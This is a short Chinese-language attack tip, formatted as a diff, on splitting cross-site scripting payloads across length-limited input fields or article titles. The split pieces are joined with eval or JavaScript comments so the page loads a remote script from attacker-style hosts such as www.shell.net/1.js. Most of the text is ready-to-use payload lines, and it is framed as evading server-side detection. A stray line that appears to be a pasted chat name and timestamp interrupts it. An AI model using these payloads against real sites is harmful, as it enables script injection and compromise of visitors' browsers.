@@ -1,0 +1,27 @@
+网站的某一个地方存在XSS，但是这个地方的输入有上限控制，显然我们不能手动改变输入框的最大长度，因为这样服务器端
+太容易检测到了。我们可以将原本要写入的脚本拆分多次上传。
+例如：存在XSS的输入框限制30各字符的输入
+<script>z='document.'</script>
+<script>z=z+'write("'</script>
+<script>z=z+'<script'</script>
+<script>z=z+' src=ht'</script>
+<script>z=z+'tp://ww'</script>
+<script>z=z+'w.shell'</script>
+<script>z=z+'.net/1.'</script>
+<script>z=z+'js></sc'</script>
+<script>z=z+'ript>")'</script>
+<script>eval(z)</script>
+这等同于<script>eval("document.write('<script src=//www.shell.net/1.js></script>')")</script>
+这个例子不好，写入的内容闭合了script标签，可以更换为类似<script>eval("document.write('<img src=# onerror=alert(4); />')")</script>
+
+除了设置一个变量之外，也可以直接表示，例如一个网站有提交文章的功能，并且可以返回一系列文章的标题。这时可以连续输入标题构成
+XSS：
+我在那一角落患过伤风 14:35:32
+标题一：<script>z='<script src=';/*
+标题二：*/z+='http://www.test.c';/*
+标题三：*/z+='n/l.js><\/script>';/*
+标题四：*/document.write(z)</script>
+特别注意/*和*/，这是因为返回的页面中，两个标题之间大概率有其他内容，可以用/*和*/将这些内容注释掉。
+
+
+
